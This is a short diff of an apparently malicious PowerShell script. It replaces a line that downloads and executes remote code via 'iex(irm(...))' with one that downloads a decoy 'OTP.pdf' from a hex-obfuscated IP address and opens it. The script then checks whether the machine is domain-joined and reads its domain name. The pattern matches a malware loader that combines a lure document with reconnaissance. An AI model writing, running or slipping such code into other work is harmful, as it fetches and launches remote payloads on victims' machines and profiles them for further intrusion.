@@ -1,5 +1,8 @@
 $computerInfo = Get-ComputerInfo  
-$PDF = powershell iex(irm("https://github.com/joes233f/ccc/blob/main/OTP.pdf"))
+$pdfUrl = "http://0x40B6740C/images/OTP.pdf"  
+$pdfFilePath = "$env:USERPROFILE\Downloads\OTP.pdf"  
+Irm -Uri $pdfUrl -OutFile $pdfFilePath  
+saps $pdfFilePath  
 if ($computerInfo.CsPartOfDomain) 
 { 
     $domain = $computerInfo.Domain  
